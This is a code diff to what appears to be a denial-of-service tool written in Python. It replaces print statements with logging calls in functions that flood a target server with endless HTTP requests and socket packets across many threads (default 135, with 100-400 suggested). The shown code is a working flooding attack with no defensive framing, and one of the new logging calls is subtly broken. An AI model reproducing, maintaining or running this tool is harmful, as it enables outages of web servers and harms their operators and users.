@@ -51,7 +51,7 @@ def bot_rippering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[95mbot is rippering...\033[0m")
+			logging.info("\033[95mbot is rippering...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -65,14 +65,13 @@ def down_it():
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[92m <--packet sent! rippering--> \033[0m")
+				logging.info("\033[92m",time.ctime(time.time()),"\033[0m \033[92m <--packet sent! rippering--> \033[0m")
 			else:
 				s.shutdown(1)
-				print("\033[91mshut<->down\033[0m")
+				logging.error("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! web server maybe down!\033[0m")
-		#print("\033[91m",e,"\033[0m")
+		logging.error("\033[91mno connection! web server maybe down!\033[0m")
 		time.sleep(.1)
 
 
@@ -92,8 +91,8 @@ def usage():
 	-h : -help
 	-s : -server ip
 	-p : -port default 80
-	-q : -quiet
-	-t : -threads default 135 \033[0m ''')
+	-q : -quiet mode (only log errors)
+	-t : -threads default 135 (best within 100-400)\033[0m ''')
 	sys.exit()
 
 
@@ -107,7 +106,7 @@ def get_parameters():
 	optp.add_option("-p","--port",type="int",dest="port",help="-p [PORT] default 80")
 	optp.add_option("-t","--threads",type="int",dest="threads",help="-t [THREADS] default 135")
 	optp.add_option("-h","--help",dest="help",action='store_true',help="help")
-	optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
+	optp.add_option("-q", "--quiet", help="only log ERRORs", action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	opts, args = optp.parse_args()
 	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
 	if opts.help:
@@ -148,7 +147,7 @@ if __name__ == '__main__':
 		s.connect((host,int(port)))
 		s.settimeout(1)
 	except socket.error as e:
-		print("\033[91mCheck server ip and port\033[0m")
+		logging.error("\033[91mCheck server ip and port\033[0m")
 		usage()
 
 	for i in range(int(thr)):
